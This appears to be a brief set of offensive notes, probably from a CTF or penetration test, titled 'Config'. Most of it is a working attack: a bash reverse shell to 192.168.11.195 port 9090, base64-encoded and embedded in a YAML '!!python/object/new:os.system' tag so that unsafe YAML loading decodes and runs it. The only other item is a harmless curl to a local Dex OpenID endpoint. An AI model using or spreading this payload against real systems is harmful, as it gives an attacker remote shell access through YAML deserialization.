# Config

## pyaml reverse shell

```bash
echo "/bin/bash -i >& /dev/tcp/192.168.11.195/9090 0>&1" | base64
```

```python
!!python/object/new:os.system [ echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTEuMTk1LzkwOTAgMD4mMQo=" | base64 -d | bash ]
```

## dex public url

```bash
curl http://localhost:5556/dex/.well-known/openid-configuration
```
